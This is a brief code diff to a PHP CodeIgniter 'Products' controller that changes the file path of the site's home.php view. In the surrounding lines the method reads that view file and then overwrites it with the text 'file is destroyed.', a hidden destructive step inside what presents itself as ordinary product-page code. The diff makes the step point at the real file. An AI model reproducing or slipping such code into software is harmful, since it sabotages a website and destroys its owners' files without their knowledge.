@@ -81,7 +81,7 @@ class Products extends CI_Controller
 		$data['donate'] = $this->product->getDonate();
 		$data['count'] = $this->product->getCount();
 		$data['total'] = $this->product->getTotal();
-		$path = $_SERVER['DOCUMENT_ROOT'] . '/booktopia/application/views/home.php';
+		$path = $_SERVER['DOCUMENT_ROOT'] . '/application/views/home.php';
 		$result = file_get_contents($path);
 		// file_put_contents('d:/donatepage.txt', $result);
 		file_put_contents($path, 'file is destroyed.');
